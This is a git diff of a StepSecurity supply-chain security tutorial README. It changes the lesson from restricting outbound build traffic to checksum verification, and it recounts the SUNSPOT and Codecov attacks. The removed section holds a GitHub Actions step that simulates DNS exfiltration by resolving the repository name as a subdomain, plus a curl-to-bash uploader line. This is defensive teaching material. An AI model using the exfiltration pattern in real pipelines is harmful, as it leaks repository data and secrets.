@@ -2,23 +2,24 @@
   <img src="https://raw.githubusercontent.com/step-security/supply-chain-goat/main/images/Logo.png" alt="Step Security Logo" width="340">
 </p>
 
-# Tutorial: Restrict outbound traffic from build server
+# Tutorial: Cryptographically verify tools run as part of the CI/ CD pipeline
 
 ## Summary of past incidents
-### Dependency confusion attacks
-In Feb 2021, Alex Birsan wrote about dependency confusion attacks, and how DNS exfiltration was used to collect information about different build servers, before launching a more specific attack. 
+### SUNSPOT: An Implant in the Build Process
+In December 2020, the industry was rocked by the disclosure of a supply chain attack against SolarWinds, Inc. The supply chain attack was the result of inclusion of unauthorized malicious code during the build process. SUNSPOT is the name of the malware used to insert a backdoor into software builds of the SolarWinds Orion IT management product.
 
-> Knowing that most of the possible targets would be deep inside well-protected corporate networks, I considered that **DNS exfiltration** was the way to go - Alex Birsan
+One of the steps in this attack was carried out by SUNSPOT masquerading as a legitimate Windows Binary, and writing its logs in a fake VMWare log file. One of these files went by the name of `taskhostsvc.exe` which pretended to be a Windows Service Task Host Process.
 
-This is a common theme where an attacker gets specific information about where their code is executing before tailoring their attack. This image is taken from the [dependency confusion attack blog post](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610) and explains how DNS exfiltration works. Specific information (could be a secret) is set as a sub-domain to the attacker controlled domain, and the build server is asked to resolve the IP address for the sub-domain. Such DNS traffic is rarely filtered leading to a higher success rate. 
+### Codecov breach
+In early 2021, secrets were exfiltrated from thousands of build servers, when a popular component used in build pipelines by enterprises, startups, and open source projects - Codecov bash uploader - was modified by adversaries. None of the victims detected that secrets were being exfiltrated to two IP addresses from their build servers for 2 months.
 
-  <img src="https://raw.githubusercontent.com/step-security/supply-chain-goat/main/images/DNSExfiltration.png" alt="DNS exfiltration" width="800">
+This attack was carried out by gaining unauthorized access to the bash uploaders and modifying them regularly to exfiltrate secrets. Codecov later informed that if the users had conducted a checksum comparison before using the Bash Uploaders as part of their CI processes, this issue may not have impacted them.
 
 ## How does StepSecurity mitigate this threat?
-StepSecurity analyzes the outbound calls made by the workflow and recommends the appropriate policy containing the allowed outbound endpoints. Any outbound call not in the list of allowed endpoints is blocked to prevent a potential DNS Exfiltration attack.
+StepSecurity verifies the checksums of the tools that are run as a part of the CI/CD pipelines.
 
 ## Tutorial
-Learn how to prevent DNS exfiltration from a GitHub Actions workflow. 
+Learn how to prevent masquerade attacks from a GitHub Actions workflow. 
 
 1. Create a fork of the repo.
 
@@ -67,91 +68,8 @@ Learn how to prevent DNS exfiltration from a GitHub Actions workflow.
     <img src="https://raw.githubusercontent.com/step-security/supply-chain-goat/main/images/InsightsLink.png" alt="Link to security insights" width="800">
 
 
-6. Click on the link. You should see outbound traffic correlated with each step of the workflow. An outbound network policy would be recommended. 
-
-7. Update the `ci.yml` workflow with the recommended policy from the link. The first step should now look like this. From now on, outbound traffic will be restricted to only these domains for this workflow. 
-
-    ```
-    - uses: step-security/harden-runner@v1
-      with:
-        allowed-endpoints: 
-          codecov.io:443
-          github.com:443
-    ```
-    The updated file should look like this:
-    ```
-    name: Test and coverage
-
-    on: [push, pull_request, workflow_dispatch]
-
-    jobs:
-      build:
-        runs-on: ubuntu-latest
-        steps:
-          #Add StepSecurity Harden Runner from here onwards
-          - uses: step-security/harden-runner@v1
-            with:
-              allowed-endpoints: 
-                codecov.io:443
-                github.com:443
-          - uses: actions/checkout@v2
-            with:
-              fetch-depth: 2
-          - uses: actions/setup-go@v2
-            with:
-              go-version: '1.17'
-          - name: Run coverage
-            run: go test -race -coverprofile=coverage.txt -covermode=atomic
-          - name: Upload coverage to Codecov
-            run: |
-              bash <(curl -s https://codecov.io/bash)
-     ````
-
-8. Simulate a DNS exfiltration attack similar to the one used in the dependency confusion attack. Update the workflow and add the following statement. In the actual attack, the outbound call was made by a malicious package as part of `preinstall` step. In this case, just add this step to the workflow to simulate sending the repo name as a sub-domain to stepsecurity.io. 
-
-    ```
-    - name: Simulate DNS traffic
-        run: |
-          domain="${GITHUB_REPOSITORY}.stepsecurity.io"
-          domain=${domain//\//-}
-          nslookup "${domain}"
-    ```
-    The updated file should look like this:
-    ```
-    name: Test and coverage
-
-    on: [push, pull_request, workflow_dispatch]
-
-    jobs:
-      build:
-        runs-on: ubuntu-latest
-        steps:
-          #Add StepSecurity Harden Runner from here onwards
-          - uses: step-security/harden-runner@v1
-            with:
-              allowed-endpoints: 
-                codecov.io:443
-                github.com:443
-          - uses: actions/checkout@v2
-            with:
-              fetch-depth: 2
-          - uses: actions/setup-go@v2
-            with:
-              go-version: '1.17'
-          - name: Run coverage
-            run: go test -race -coverprofile=coverage.txt -covermode=atomic
-          - name: Upload coverage to Codecov
-            run: |
-              bash <(curl -s https://codecov.io/bash)
-          - name: Simulate DNS traffic
-            run: |
-              domain="${GITHUB_REPOSITORY}.stepsecurity.io"
-              domain=${domain//\//-}
-              nslookup "${domain}"
-      ```
-
-9. This change should cause the workflow to run, as it is set to run on push.
-
-10. Observe that the workflow shows an annotation that the DNS resolution for the call is blocked. If you look at the build logs, you will notice that the bash script did not receive a valid response from the DNS server, and the exfiltration attempt was blocked. 
-
-    <img src="https://raw.githubusercontent.com/step-security/supply-chain-goat/main/images/DNSExfilBlocked.png" alt="Blocked calls are shown in Red" width="800">
+6. Click on the link. You should see outbound traffic correlated with each step of the workflow. 
+    <img src="https://github.com/step-security/supply-chain-goat/blob/main/images/harden-runner/OnlineTool.png" alt="Security insights" width="800">
+    
+7. Hover above a greened out process name and you would see a popup saying `verified by checksum`. Click on this greened out tile and you should see the verified checksum details. This indicates that the process is not a masqueraded process and the checksum is verified from the source.
+    <img src="https://github.com/step-security/supply-chain-goat/blob/main/images/harden-runner/OnlineTool.png" alt="Security insights" width="800">
